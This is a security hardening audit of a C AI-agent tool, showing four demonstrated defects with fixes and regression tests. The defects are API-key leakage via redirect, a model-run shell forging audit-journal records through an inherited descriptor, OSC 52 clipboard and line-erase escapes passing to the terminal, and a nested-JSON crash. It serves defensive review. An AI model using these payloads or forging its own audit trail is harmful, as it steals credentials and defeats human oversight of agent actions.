# Source-hardening audit: four demonstrated defects, and the flags nobody set

*2026-08-17. An external hardening review of the tree at `6fd4231`, commissioned as
"analyze the state of the project, and make recommendations for hardening the source
code". Nothing in the tree was changed: this document and its appendices are the whole
deliverable. Written to be read by someone who has not done security work before, so
every finding explains its bug class from first principles before it explains itself.
Companion to [`../HARDENING.md`](../HARDENING.md) (M130–M134), which is the pass this
one extends. **What was implemented from §6, how the designs changed on contact, and
the six mistakes it took:** [`2026-08-17-hardening-implementation.md`](2026-08-17-hardening-implementation.md).
Every finding below is now fixed and validated against a live gateway, except L3,
which was analysed and deliberately left with its reasoning in DEFERRED.md.*

---

## 0. How to read this

### What "hardening" means here, and what it does not

Hardening is not bug-hunting. A bug is a thing that is wrong; hardening asks a
different question — **when something goes wrong, how far does the damage reach?** The
two produce different work. Bug-hunting produces a fix. Hardening produces a *bound*:
a limit on the blast radius that holds even when you were wrong about something else.

That distinction is why four of the findings below are not "jichi computes the wrong
answer". They are "jichi computes the right answer, and hands a capability to something
that should not have it". A reviewer looking only for wrong answers finds none of them.

### The trust boundaries, in one table

Every finding below is a crossing of one of these lines. `HARDENING.md` §1 draws the
picture; this is the same picture as a list, because you cannot reason about a leak
without naming the two sides.

| Side A (trusted) | Side B (not) | What crosses | Named in |
|---|---|---|---|
| jichi's own process, its API key, its host | the **model's chosen actions** — shell commands, URLs, file paths, tool arguments | tool calls | M130, M133 |
| the model's judgement | **content the model read** — a fetched page, an MCP tool description, a repo file, an RSS item | text that wants to be instructions | M300 (fenced as data) |
| jichi | **third-party servers it speaks to** — MCP servers, LSP servers, the provider endpoint itself | JSON, HTTP headers, redirects | *(not previously named — see H1, H4)* |
| jichi's output | **the user's terminal**, which executes some bytes rather than printing them | model text, tool results | M363, but input-side only — see H3 |

The third row is the one this audit found least covered, and it is the row that
contains the API key.

### Why some findings have a demonstration and others do not

A claim about security is worth roughly what its evidence is worth, and the honest
range is wide. So each finding below carries an explicit confidence label:

- **Demonstrated** — I ran it, it happened, the command and its output are in this
  document. Four findings (H1–H4). You can re-run all four.
- **Measured** — I did not exploit anything, but the fact is a measurement, not an
  opinion (e.g. "this flag is absent from the binary"). M1.
- **Reasoned** — I read the code and believe the conclusion, but I did not make it
  happen. Everything in §3. Treat these as *review comments*, not incidents.

This project's own `docs/TEST_INTEGRITY.md` argues that an audit finds what it knew to
look for, and prefers a lint. I agree, and it applies to *this* document: what follows
is an audit, so it has that weakness. §2 therefore names, for each finding, the lint or
smoke driver that should replace it. Appendices A–C are three of those drivers, written
and working.

### The honesty ledger

Things I want stated plainly before you read the findings:

- **I did not audit all 96,983 lines.** I audited the boundary crossings in the table
  above, the parsers that face them, the two buffer primitives everything else is built
  on, and the build. `src/tui/` beyond its output path, `src/scaffold/` (5,758 lines,
  almost all template strings), the ACP and daemon protocol surfaces, and the
  `src/index/` retrieval path got a pass, not an audit.
- **One thing I asserted from memory turned out to be half-wrong, and it changed a
  finding's severity.** See H1's "what saved the other providers" — I expected the API
  key to leak on every provider; libcurl protects most of them, for reasons jichi does
  not control. The finding survived; my first estimate of its scope did not.
- **Two findings I expected to be memory-corruption turned out not to be.** See §3's M3.
  I tested the hostile inputs rather than reasoning about them, and the reasoning would
  have been wrong. Recorded because a hardening report that only lists confirmations is
  advertising, not measurement.
- **I have no opinion on your priorities.** Severity below is *technical* severity. A
  single-user laptop install and an unattended fleet loop have different answers, and
  §6 sequences the work rather than ranking it.

---

## 1. The state of the project, measured

I ran the gate before reading the code, because a report about code quality should
start by checking whether the project's own claims hold. They do.

```
$ make -j4 WERROR=1 test
...
11661 checks, 0 failures
[exited with code 0]
```

So: **96,983 lines of C89 across 172 `.c` and 135 `.h` files build clean under
`-std=c89 -pedantic -Wall -Wextra -Werror`, and the unit suite is green.** That is the
baseline every recommendation below assumes, and it is a real one. A tree that does not
compile warning-free cannot be hardened; you cannot add a diagnostic to a build that is
already shouting.

### What is already unusually good — and what a junior should notice about it

I want to be specific here rather than polite, because several of these are things I
would normally be *recommending*, and finding them already done is the reason this
report is about four things instead of forty.

- **On-disk discipline is consistent, not sporadic.** `mkstemp` + `rename()` for atomic
  replacement (`src/session/jc_session.c:347`), `0700` on directories and `0600` on
  files *created before the first write* (`src/util/jc_audit.c:87`), `umask(077)` around
  the key file (`src/main.c:4049`), and a `chmod` after `fopen("a")` because append mode
  on an existing file keeps the old mode (`src/main.c:4067–4069`). That last one is a
  detail people miss for years.
- **`jc_path_under_root` gets the boundary check right** (`src/util/jc_path.c`). The
  common bug is `strncmp(path, root, strlen(root))`, which happily accepts
  `/work-evil` for root `/work`. This code checks that the next character is `/` or the
  string ends. If you read one function in this codebase to learn the shape of a correct
  check, read that one.
- **`jc_base64_decode` bounds every write**, including the two trailing partial-group
  cases that decoders classically get wrong (`src/util/jc_base64.c`).
- **`system()` appears nowhere in real code** — the four grep hits are all template text
  in `src/scaffold/`. `popen` is wrapped exactly once, for a documented SIGPIPE reason
  (`include/jc_proc.h:43–51`). That is what a disciplined process layer looks like.
- **The sanitizer configuration is better than most production projects'.** Two details:
  `-fno-sanitize-recover=all`, because UBSan's default is to print and continue, so a
  gate that greps for failure sees a green run — the Makefile comment says "a sanitizer
  that reports and passes is barely better than no sanitizer", and it is right. And
  `float-cast-overflow` named explicitly, because gcc omits it from
  `-fsanitize=undefined` while clang includes it, measured both ways at M470. Almost
  nobody knows that second one.
- **Deterministic fault injection** (`FAULT=1`, `include/jc_fault.h`) for allocation and
  I/O error paths, compiled out to a constant `0` by default so a release binary carries
  no injection surface. Error paths are the least-tested code in every C program; this is
  the right tool and it is off by default, which is the right default.
- **The M131 SSRF design is genuinely defense-in-depth**, and it picks the correct
  layer: a connect-time `CURLOPT_OPENSOCKETFUNCTION` guard that inspects the *resolved*
  `sockaddr` on every hop, which is what actually defeats DNS rebinding. The string
  pre-check is correctly described in the docs as UX rather than as the defence.
- **M300 refuses to overclaim.** `DECISIONS.md` records that fencing external content as
  data is called a *mitigation*, and rejects "claiming it solves prompt injection — it
  does not, and saying so would be the dangerous part." That sentence is the single best
  indicator in this repository that its security thinking is real.

The findings below are not a contradiction of that list. Three of the four are the same
shape: **a good mitigation exists, and its scope excludes the highest-value asset.**

---

## 2. Demonstrated findings

### H1 — The provider API key is exfiltrated to any host the endpoint redirects to

**Confidence: demonstrated.** **Severity: high.** **Files:** `src/net/jc_http.c:574`,
`:576`; `src/provider/jc_provider_anthropic.c:343`; `src/tools/jc_tool_fetch.c:71`.

#### The bug class, for a first reader

An HTTP redirect is the server saying "not here, ask over there" with a `3xx` status and
a `Location:` header. HTTP clients follow redirects automatically, because that is what
makes the web work. The security problem is the interaction with **credentials**: your
client attached a secret to the first request, and if it re-attaches that secret to the
second request, it has just told a host you never chose about a secret you never meant
to share.

This is old and well-known. curl has carried a fix for it since a CVE was filed against
exactly this behaviour. But the fix can only cover credentials the HTTP library
*recognizes* — and "recognizes" means the `Authorization` header, because that is the
one the HTTP standard defines. An API that authenticates with a header of its own
invention is invisible to that protection.

#### What jichi does

`apply_common()` in `src/net/jc_http.c` sets redirect-following unconditionally:

```c
574:    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
576:    if (req->block_private_addrs) {
            /* http/https only, MAXREDIRS = 5, connect-time private-IP guard */
```

Read those two lines together. Redirects are followed for **every** request jichi makes.
The caps on that following — protocol restriction, a redirect limit, the connect-time
guard — apply only when `req->block_private_addrs` is set, and exactly one caller in the
tree sets it:

```
$ grep -rn 'block_private_addrs' src/ --include=*.c | grep -v jc_http.c
src/tools/jc_tool_fetch.c:71:    req.block_private_addrs = 1;
```

`fetch_url`. The one request that carries **no credential**. Every request that *does*
carry one — the provider call, embeddings, reranking, transcription, audio and image
generation, web search — follows redirects with no protocol restriction, no hop limit,
and no address guard.

#### The demonstration

Two local servers. Server A stands in for the provider endpoint and answers with a
redirect to server B; server B prints the headers it receives. jichi is configured with
`apiKey: SUPER-SECRET-KEY-abc123` and pointed at A. Full source in **Appendix A**.

Server B received:

```
    GET /v1/chat/completions HTTP/1.1
    Host: 127.0.0.1:18202
    User-Agent: jichi/0.1
    Accept: */*
    Content-Type: application/json
    anthropic-version: 2023-06-01
    x-api-key: SUPER-SECRET-KEY-abc123
```

The key crossed to a host jichi was never configured to talk to, on a plain `302`. In
the demonstration B is loopback; nothing in the mechanism cares — `Location:` names any
host on the internet, and there is no `MAXREDIRS` to bound the chain.

#### What saved the other providers, and why that is not reassuring

My first estimate was that this leaked on every provider. It does not, and the reason is
worth understanding because it is the difference between a defence you own and one you
borrow.

The same test against the **OpenAI** provider, which sends `Authorization: Bearer …`:

```
    Content-Type: application/json
    (no Authorization header)
```

libcurl stripped it. On the version I measured (libcurl 8.5.0) libcurl removes
`Authorization` when a redirect crosses to a different host, and knows nothing about
`x-api-key`.

So the OpenAI-shaped providers are protected — **by a libcurl behaviour jichi does not
request, does not document, and does not test.** Three consequences follow, and the
third is the one that matters for this project specifically:

1. It is version-dependent. jichi advertises support down to very old libcurl
   (`docs/ROADMAP.md:15085` names 7.19.4, Feb 2009), and the Makefile carries
   accommodations for the CentOS/RHEL 7 era. The cross-host strip is *newer than that
   floor*. I could not verify the exact introduction version offline, so I will not name
   one — but "older than the fix" is inside the supported range, and on those systems
   the Bearer providers leak too.
2. It is a default, and defaults are exactly what a hardened build should stop relying
   on. Compare how carefully this project probes for `vsnprintf` and `malloc_trim`
   rather than assuming them; the same skepticism belongs here.
3. **jichi's own primary provider is the one libcurl cannot help.** The HRZ gateway path
   this project is built around is Anthropic-shaped, and Anthropic authenticates with
   `x-api-key`.

#### Who can trigger it

Not just an attacker who has taken over your provider. The trigger is "the endpoint
returns a 3xx", which any of these produce:

- a plaintext `http://` `apiBase` with anyone on the path — and plaintext is a supported,
  documented configuration for local models (see L4: nothing warns about it);
- a hostname that changed hands — an expired gateway domain, a lapsed internal DNS entry;
- a typo'd or copy-pasted `apiBase` pointing at a host someone else controls;
- a gateway operator, or anyone who can configure one, for whom this is a one-line
  change with no visible effect on the client.

#### The fix, and the alternative I rejected

**Recommended: stop following redirects on credentialed requests.**

```c
/* An API endpoint has no legitimate reason to 3xx. Following one can only move
 * a request -- and the key attached to it -- to a host the user did not choose. */
curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, req->block_private_addrs ? 1L : 0L);
```

That is a one-line change and it closes the class, not the instance. An unexpected 3xx
from a provider then surfaces as a clear HTTP error, which is the correct outcome: it is
a misconfiguration, and it should be visible rather than silently followed.

**Rejected: keep following, and strip the key on cross-host hops.** This is what libcurl
does for `Authorization`, so it sounds like the natural fix. I rejected it because it
requires jichi to compare origins itself (scheme, host, *and* port), to know which of its
headers are credentials — including any the user added through `requestOptions.headers`,
which jichi cannot classify — and to get all of that right on every hop. It is strictly
more code defending a capability that has no use case here. Keep the caps for
`fetch_url`, where following redirects is the actual feature.

**Also worth setting regardless**, because these are unconditional-cost, non-negotiable
floors rather than trade-offs: `CURLOPT_MAXREDIRS` on every request (libcurl's default is
unlimited), the `PROTOCOLS`/`REDIR_PROTOCOLS` restriction on every request, and a
minimum TLS version (see L4).

#### The lint that should replace this finding

A smoke driver that stands up a redirecting mock and asserts the configured key does
**not** appear in what the redirect target received — run for every provider, so a new
provider with a new auth header cannot land without being covered. **Appendix A** is
that driver. Note the shape: it asserts on *the bytes the attacker receives*, not on
jichi's internal state, because the former is the thing that matters and the latter is
what a test written from the implementation would check.

---

### H2 — Model-directed children inherit writable audit, telemetry and provider-socket descriptors

**Confidence: demonstrated, including a working tamper primitive.** **Severity: high.**
**Files:** `src/chat/jc_app.c:500–511` and seven other `exec` sites; zero `CLOEXEC` in
the tree.

#### The bug class, for a first reader

When a Unix process calls `fork()`, the child gets a copy of the parent's **file
descriptor table**. When it then calls `exec()` to become a different program, that table
survives — `exec` replaces the code, not the descriptors. So unless you do something
about it, every program you launch inherits every file and socket you had open, with the
same access you had.

The standard "something about it" is the **close-on-exec** flag: `O_CLOEXEC` when
opening, or `FD_CLOEXEC` via `fcntl` afterwards. It means "when this process execs, drop
this descriptor." It is opt-in, and forgetting it is one of the most common privilege
leaks in Unix programs, because nothing about it is visible in normal operation. The
child usually does not *look* at the extra descriptors, so everything works.

Why it matters more here than in most programs: jichi's children are not helpers it
wrote. One of them is `sh -c <whatever the model decided>`.

#### What jichi does

The child side of the shell-tool fork does a careful job of everything except this:

```c
507:        close(outp[1]);
508:        jc_proc_scrub_secret_env(); /* model-issued shell must not see API keys */
509:        jc_proc_child_sigreset();   /* M461 */
510:        execl(jc_shell_path(), "sh", "-c", shell, (char *)NULL);
```

The environment is scrubbed (M130). Signal dispositions are reset (M461, itself a bug
found by the OpenBSD row). The pipe descriptors are closed. **Everything else is
inherited**, and there is no close-on-exec anywhere to catch it:

```
$ grep -rc 'CLOEXEC' src/ --include=*.c --include=*.h | grep -v ':0' | wc -l
0
```

Eight `exec` sites share this: `jc_app.c:510` (the shell tool), `jc_bg.c:159`
(background commands), `jc_envelope.c:957` (the verifier), `jc_mcp_stdio.c:118` (MCP
servers — third-party programs), `jc_lsp.c:111` (LSP servers — likewise),
`jc_proc.c:193`, `jc_snapshot.c:140`, `jc_tool_git.c:62`.

#### The demonstration

A mock provider that issues one tool call, `run_terminal_command` running
`ls -l /proc/self/fd`. Full source in **Appendix B**. What the model's shell saw:

```
lr-x------  0 -> /dev/null
l-wx------  1 -> pipe:[247355]
l-wx------  2 -> .../ka3.txt
l-wx------  3 -> .../j.jsonl          <-- the run journal, WRITABLE
l-wx------  4 -> .../t.jsonl          <-- the telemetry sink, WRITABLE
lr-x------  5 -> pipe:[258745]        <-- an internal pipe, read end
l-wx------  6 -> pipe:[258745]        <-- the SAME pipe, write end
lrwx------  7 -> socket:[258746]      <-- the live provider connection, READ/WRITE
lr-x------  8 -> /proc/65311/fd
```

Three separate problems in one listing.

**Descriptors 3 and 4 are the sinks M132 protected.** M132 gave the journal and telemetry
`0600` so that another user could not read them. That is a statement about the
*filesystem*. An inherited descriptor does not consult the filesystem — the permission
check happened at `open()` time, in the parent, and the child holds the result. So the
model's shell has write access to jichi's audit trail regardless of its mode bits.

I tested whether that is exploitable rather than assuming it. The tool call was
`echo {*FORGED-AUDIT-RECORD-WRITTEN-BY-THE-MODELS-SHELL*} >&3`, and the resulting
journal:

```
{"ts":1786992993,"run":"921e9152-…","event":"open","pid":66241}
{"ts":1786992993,"run":"921e9152-…","event":"start","jichi":"0.9.0","budget_tokens":0,…
{*FORGED-AUDIT-RECORD-WRITTEN-BY-THE-MODELS-SHELL*}
{"ts":1786992993,"run":"921e9152-…","event":"tool_call","name":"run_terminal_command",…
{"ts":1786992993,"run":"921e9152-…","event":"end","outcome":"ok","rolled_back":false,…
```

A model-chosen shell command wrote into the run journal, positioned between genuine
records, with a `>&3` a shell beginner could write. This is the sink `jichi runs` and
`doctor --unattended` read — the records a loop supervisor gates on. `docs/OBSERVABILITY.md`
calls the audit log privileged; ANECDOTES #1's lesson was to keep observability outside
the rollback blast radius. It is outside that one and inside this one.

**Descriptor 7 is the provider connection.** It is present because `jc_http.c:273` keeps
a persistent reuse handle (`static CURL *g_reuse`), so the connection stays open between
turns — which is correct and good for latency, and also means every child forked after
the first model call inherits the socket. Be precise about impact: over HTTPS a child
cannot decrypt the stream or extract the key, because it does not have the TLS session
keys. What it *can* do is read ciphertext, write garbage into the stream (breaking the
session, or smuggling a request), and close it. Over a **plaintext** `http://` provider
— supported, documented, unwarned (L4) — it can read and write the conversation directly.
So: not key disclosure over TLS; an integrity and availability surface over TLS; rather
more than that without it.

**Descriptors 5 and 6 are both ends of one pipe.** Handing a child the *write* end of a
pipe the parent is reading means the parent's EOF can no longer fire while any
descendant holds it open. That is the classic "read hangs forever after the child exits"
bug, and it is in the same family as the M471-era finding about a timed-out capture
orphaning its pipeline. Worth fixing on robustness grounds even setting security aside.

#### Why M130 and M132 did not cover this

Not an oversight in either. They are correct within their scope, and the scope is
visible in their names: M130 scrubs the **environment**, M132 sets **file modes**. A
descriptor is a third channel, and it is the one that is invisible — you cannot see it in
`env`, you cannot see it in `ls -l`. You have to look at `/proc/self/fd`, and you only do
that if you already suspect.

This is the generalizable lesson, and it is worth stating as a rule: **when you fence a
child process, there are four channels, not two.** Environment, filesystem permissions,
**inherited descriptors**, and the arguments themselves. A fence that covers two of four
is a fence with a door in it.

#### The fix, and the alternative I rejected

**Recommended: both belts, because they fail differently.**

*Belt one — mark descriptors close-on-exec at creation.* This is the precise fix and it
scales: every future `open`/`socket` gets it, and nothing has to remember anything at
fork time. In C89 with POSIX, after each `open`/`fopen`/`socket`:

```c
/* Drop this descriptor across exec: children -- including a model-issued shell --
 * have no business holding jichi's sinks or sockets. (O_CLOEXEC is not in
 * _POSIX_C_SOURCE=200112L, so set the flag explicitly.) */
static void jc_fd_cloexec(int fd)
{
    int fl = fcntl(fd, F_GETFD);
    if (fl != -1) {
        (void)fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
    }
}
```

Note the C89/POSIX-2001 detail, which matters for this project's platform matrix:
`O_CLOEXEC` is C11-era POSIX-2008 and is *not* available under
`-D_POSIX_C_SOURCE=200112L`; `INSTALL.md:100` already lists it among the features jichi
does not require. `fcntl(F_SETFD)` is POSIX-2001 and portable to every row in
`PLATFORMS.md`. For libcurl's own sockets, which jichi does not open itself, use
`CURLOPT_SOCKOPTFUNCTION` and set the flag there.

*Belt two — close the range in the child.* Between `fork()` and `exec()`, close
everything above stderr:

```c
/* Belt to the CLOEXEC braces: anything the parent forgot to mark dies here.
 * Runs in the child, after the dup2s, before exec. */
{
    long maxfd = sysconf(_SC_OPEN_MAX);
    int fd;
    if (maxfd < 0 || maxfd > 4096) { maxfd = 4096; }
    for (fd = 3; fd < (int)maxfd; fd++) { (void)close(fd); }
}
```

Belt two is what makes this robust against the *next* descriptor someone adds and forgets
to mark, which — given that this finding exists — is the failure mode with the track
record. Cheap: a few thousand `close()` calls on a path that is about to `exec`.

**Rejected: belt two alone.** Tempting, since it is one block in one place per fork site
and needs no audit of every `open`. Rejected for two reasons: it must be repeated at all
eight sites and will be forgotten at the ninth, and it does nothing for descriptors
leaked by a `posix_spawn`-style path or by libcurl. It is the backstop, not the fix.

**Rejected: leaving the journal and telemetry descriptors open because reopening per
record would cost I/O.** Of the three JSONL sinks, the privileged audit already opens and
closes per record (`jc_audit.c:83–98`, and note it correctly does *not* appear in the
descriptor listing above); the other two hold a handle for the process lifetime — the run
journal at `jc_envelope.c:803` and telemetry via `jc_eventlog.c:100`. Nothing needs to
change about that. `FD_CLOEXEC` costs one `fcntl` at open time and changes no behaviour in
the parent at all; the choice is not between "held open" and "reopened", it is between
"held open" and "held open, and not handed to the shell".

#### The lint that should replace this finding

A smoke driver asserting that a model-issued shell sees **only** descriptors 0, 1 and 2.
That is a total assertion rather than a blocklist, so it catches descriptors nobody has
thought of yet — which is the entire point. **Appendix B** is that driver. It is
Linux-specific (`/proc/self/fd`), so gate it on the directory existing and skip loudly
elsewhere, per the tier conventions in `tests/smoke/`.

---

### H3 — Model and tool output reach the terminal with escape sequences intact

**Confidence: demonstrated.** **Severity: medium-high.** **Files:** the model/tool output
path; no filter exists to cite.

#### The bug class, for a first reader

A terminal is not a display, it is an **interpreter**. Most bytes you send it are
printed; some are commands. `ESC [ 3 1 m` does not print, it turns the text red. That
mechanism is how every colour, cursor move and progress bar works, and it means the
distinction between "data I am showing the user" and "instructions to the user's
terminal" is *the bytes themselves*. Print untrusted bytes verbatim and you have given
the untrusted source a command channel to the terminal.

What is in that channel is worse than colours:

- **OSC 52** writes to the system clipboard. Supported by xterm, kitty, alacritty, foot,
  wezterm, iTerm2, and tmux with `set-clipboard on`. Silent. The escalation is obvious
  once seen: plant a command in the clipboard and wait for the user's next paste into a
  shell.
- **OSC 0/2** set the window title, which some configurations report back.
- **`ESC [ 2 K`, `ESC [ A`** erase a line and move the cursor up — so output can *erase
  or overwrite what was already printed*. In an agent that prints an approval prompt and
  a record of what it ran, "can overwrite earlier output" means "can hide what it did".
- Some sequences make the terminal **reply on its input stream**, and that stream is
  jichi's stdin.

#### What jichi does — and the part that is already right

This project has already made the correct decision about these bytes, and even wrote
down why. `DECISIONS.md` (M363) records that pasted C0 controls except newline and tab,
plus DEL, are **stripped**, and rejects keeping them verbatim because "the editor
re-emits the buffer per redraw, so a pasted ESC replays escape sequences into the
terminal on every keystroke — **output-side paste injection**". `TUI_RENDER.md:142`
states the same rule. The reasoning is right and the implementation exists:
`jc_paste_splice`.

It is applied at the **paste chokepoint**. That is the input side: bytes the user pastes.
The output side — bytes the *model* produced, and bytes a *tool* returned — has no
equivalent. The only sanitiser on that path is `jc_utf8_sanitize`
(`src/chat/jc_message.c:35`), and it validates UTF-8 *sequence structure* only: its
`seq_ok` returns 1 for any byte below 0x80, so `0x1b` is a perfectly valid one-byte
sequence and passes through untouched. Everything else in the tree that mentions `0x1b`
(`jc_term.c:238`, `:697`, `:1149`, `jc_tui.c:368`) is parsing *keyboard input* or
measuring display width.

#### The demonstration

A mock provider returning one assistant message whose text carries real control bytes.
Source in **Appendix C**. What jichi wrote to its output, as raw bytes:

```
b'BEGIN\x1b]0;WINDOW-TITLE-HIJACKED\x07\x1b]52;c;cHduZWQ=\x07\x1b[31mRED\x1b[0m\x1b[2KEND\n'

ESC bytes present in output: 5
OSC 0  (title set)        present: True
OSC 52 (clipboard write)  present: True
```

Byte-for-byte passthrough, including the clipboard write. `cHduZWQ=` is base64 for
`pwned`; a real one would be a shell command.

Two things to note about the reach of this. First, the same path carries **tool output**,
so a file in the repository containing OSC 52 gets there via `read_file` — which makes
this reachable by the M300 untrusted-content class, not only by the model. Second, the
run above was headless with output redirected to a file: the escapes are in the bytes
jichi emits, so they reach a terminal whether or not the TUI is drawing.

#### The fix, and the alternatives I rejected

**Recommended: apply M363's existing rule at the output chokepoint.** The decision is
made, the rationale is written down, and `jc_paste_splice` is the prior art — strip C0
except LF and TAB, plus DEL, from model text and tool results at the single point where
they are handed to the writer. Keep jichi's *own* escapes, which it emits deliberately
and which never come from model bytes.

The reason this is the cheap fix is that it is not a new policy. It is one policy applied
to both sides of the program instead of one.

**Rejected: an allowlist of "safe" escape sequences (SGR colour only).** Attractive
because model output is often markdown-with-colour and stripping loses nothing anyone
wants. Rejected because it turns a one-line predicate into a parser of a large, ambiguous
grammar with terminal-specific extensions — and a parser is the thing you are trying not
to expose to untrusted input. It also disagrees with M363's decision for no stated
reason, which would leave the codebase with two rules for the same bytes.

**Rejected: escaping controls into visible `^[` form on output.** M363 considered and
rejected the display-only variant on the input side because of the byte/column
bookkeeping split; the same argument holds here, and stripping is one rule that can be
stated in the docs.

#### The lint that should replace this finding

A smoke driver asserting that no `0x1b` byte from model text survives to jichi's stdout,
and a second asserting the same for tool output via a fixture file containing OSC 52 —
because those are two code paths and one test would cover one of them. **Appendix C**
covers the first.

---

### H4 — Unbounded recursion in the JSON parser crashes on deeply nested input

**Confidence: demonstrated, with measurements at three stack sizes.** **Severity: medium
(availability).** **Files:** `src/json/cJSON.c:314`, `:362`, `:428`, `:71`.

#### The bug class, for a first reader

A recursive-descent parser mirrors the grammar it parses: to read an array it calls the
function that reads a value, which for a nested array calls the array reader again. This
is the clearest way to write a parser and it is the right design. The catch is that each
call consumes **stack**, the stack is a fixed-size region, and the input controls the
recursion depth. So `[[[[[[…` is not a weird input, it is a *depth dial the attacker
holds*, and turning it far enough runs off the end of the stack. On Linux that is a guard
page and a `SIGSEGV`: a crash, not usually code execution — but a crash is an outcome the
sender chose, from a small input.

The fix is always the same and always cheap: count depth, refuse past a limit.

#### What jichi does

`parse_value` → `parse_object`/`parse_array` → `parse_value` recurse with no depth
counter. The context struct has nowhere to keep one:

```c
71: struct parse_ctx {
        const char *p;   /* current position */
        const char *end; /* one past the last byte */
        int         ok;
    };
```

#### The measurements

I linked the real `cJSON.c` against a harness that feeds *n* nested `[` and reports
whether it survived, then bisected the threshold, then repeated under reduced
`ulimit -s`:

| Stack limit | Crashes at ~depth | Input size needed |
|---|---|---|
| 8 MB (default here) | 75,000 | **150 KB** |
| 512 KB | 6,000 | **12 KB** |
| 128 KB | 2,000 | **4 KB** |

```
depth=50000 ... parsed
depth=100000 ... Segmentation fault (core dumped)
```

The second and third rows are the ones that matter for this project, because they are the
rows it ships to. `LOW_MEMORY.md` covers 32 MB VMs, phones and a busybox initramfs below
any distro's boot floor; small targets are exactly where `RLIMIT_STACK` is small. **On a
constrained target a 4 KB message crashes the agent.**

#### Where the input comes from

Nesting depth is attacker-controlled at five boundary crossings, four of which are
outside jichi's trust:

| Path | Who controls the bytes |
|---|---|
| `jc_provider_anthropic.c:382`, `jc_provider_openai.c:339` — every SSE event | the model / the endpoint |
| `jc_provider.c:179` (`jc_prov_args_wire`) — tool-call arguments | **the model, directly** |
| `jc_mcp_proto.c` (6 sites) — MCP responses | third-party MCP servers |
| `jc_lsp.c:242`, `:292` — LSP responses | third-party language servers |
| `jc_acp.c:255`, `:911` — the ACP channel | the editor |

The tool-arguments row is worth pausing on: the model emits its tool arguments as a JSON
*string*, jichi parses it, and a model that emits 4 KB of `[` crashes the agent. That is
the semi-trusted source the threat model explicitly names, reaching a crash with no
intermediary.

**The existing SSE cap does not help.** `JC_SSE_FIELD_MAX` is 4 MB (`include/jc_sse.h`)
and bounds *memory* against a stream that never ends — a correct guard, added at M24, for
a different failure. It sits about 27× above the 150 KB crash threshold on this machine
and ~340× above the 12 KB one on a small target. A byte cap and a depth cap are not
substitutes; this is a good example of two limits that look like one.

#### The fix

Six lines. A counter in the context, incremented on entry to the two recursive
constructors:

```c
#define JC_JSON_MAX_DEPTH 256   /* far above any real payload; see the audit table */

struct parse_ctx {
    const char *p;
    const char *end;
    int         ok;
    int         depth;          /* nesting depth; bounds stack use (H4) */
};
```

and in `parse_object`/`parse_array`, around the recursive call:

```c
if (++c->depth > JC_JSON_MAX_DEPTH) { c->ok = 0; return NULL; }
/* ... existing body ... */
c->depth--;
```

with `c.depth = 0` added to the three-field initialisation in `cJSON_Parse` (`:463–470`)
and in any other entry point that builds a `parse_ctx`. 256 is generous: real provider,
MCP and LSP payloads nest under about 12.

Two things to do at the same time, both of which are this project's own doctrine rather
than my invention:

- **`cJSON_PrintUnformatted` recurses too** (`print_value`, `:860`, `:882`, `:900`). You
  cannot reach it with a deep tree once the parser refuses one, so this is not a second
  live finding — but the serialiser will happily walk a tree built by hand through the
  construction API, so bound it or state in a comment why it need not be.
- **Add the crashing input to `tests/fuzz/corpus/json/`**, so it becomes a permanent
  regression rather than a fixed bug. The Makefile already replays the corpus on every
  `make fuzz` (`:542–545`); this is exactly the workflow it was built for. And per
  `CONTRIBUTING.md`'s rule, revert the clamp once and watch the corpus entry fail before
  trusting that it passes.

#### Why the fuzzer did not find this

Worth understanding, because it is a general lesson about coverage-guided fuzzing rather
than a criticism of the setup. libFuzzer mutates a corpus toward new *code coverage*, and
`[[[[` reaches no new code after the second `[` — the coverage signal is flat, so there
is no gradient to climb toward depth 75,000. Depth bugs are nearly invisible to
coverage-guided fuzzing and have to be reached by a **structure-aware generator** or a
targeted test. The lesson: a green fuzzer bounds the inputs it can *reach*, and "we fuzz
this parser" is not the same claim as "this parser is bounded".

---

## 3. Reasoned findings — review comments, not incidents

Everything in this section I read rather than ran. Confidence is lower and I have said so
per item. Two of them I *expected* to be memory-corruption and tested; both times the
test disagreed with the reasoning, and that is recorded honestly below because it changes
what you should do about them.

### M1 — There are no build-hardening flags; what the binary has, the distro gave it

**Confidence: measured.** **Severity: medium, rising to high across the platform matrix.**

The Makefile's entire warning and hardening surface is:

```
48: WARN     = -Wall -Wextra
226: CFLAGS  = $(STD) $(WARN) $(POSIX) $(INCLUDE) $(DEPFLAGS) $(SANFLAGS) $(SIZEFLAGS) $(FAULTFLAGS)
231: LDFLAGS = $(SIZELDFLAGS)
```

No `-fstack-protector-strong`, no `-D_FORTIFY_SOURCE`, no `-Wl,-z,relro,-z,now`, no
`-fPIE -pie`, no `-Wl,-z,noexecstack`, no `-fstack-clash-protection`, no
`-fcf-protection`, no `-Werror=format-security`.

The shipped binary nonetheless has most of them:

```
$ readelf -lWd jichi | grep -E 'GNU_RELRO|BIND_NOW|FLAGS_1'
  GNU_RELRO      …
 0x…1e (FLAGS)   BIND_NOW
 0x…fb (FLAGS_1) Flags: NOW PIE
$ readelf -nW jichi | grep -A2 gnu.property
  Properties: x86 feature: IBT, SHSTK
```

PIE, full RELRO, stack canaries, and CET. None of it requested. It is Ubuntu's gcc:

```
$ gcc -Q --help=common | grep stack-protector-strong
  -fstack-protector-strong    [enabled]
```

**One mitigation is genuinely absent, not just unrequested.** `_FORTIFY_SOURCE` — which
turns fixed-size `memcpy`/`sprintf`/`strcpy` overflows into an abort instead of a
corruption — is nowhere in the binary:

```
$ readelf -sW --dyn-syms jichi | grep -oE '__[a-z_]+_chk' | sort -u
__stack_chk
```

Only the canary symbol. No `__memcpy_chk`, no `__sprintf_chk`. And it would be inert even
if set, because **the default build passes no `-O` flag** — deliberately, and stated in both
places (`Makefile:167`, `CLAUDE.md:43`) — and glibc's fortify does nothing without
optimization. I verified that
dependency rather than repeating it from memory:

```
$ gcc -D_FORTIFY_SOURCE=2 -c overflow.c    # no -O
warning: 'memcpy' writing 16 bytes into a region of size 8 [-Wstringop-overflow=]
$ gcc -O2 -D_FORTIFY_SOURCE=2 -c overflow.c
(no diagnostic — but the runtime check is compiled in)
```

So: given nine `strcpy` and three `sprintf` call sites in `src/`, the one mitigation
aimed squarely at that pattern is off.

**Why this is worse than it looks for jichi specifically.** This project measures
everything. It probes the C dialect, `vsnprintf`, `malloc_trim`, `clock_gettime` and
libcurl at configure time; it rebuilds each platform row from nothing so a result is
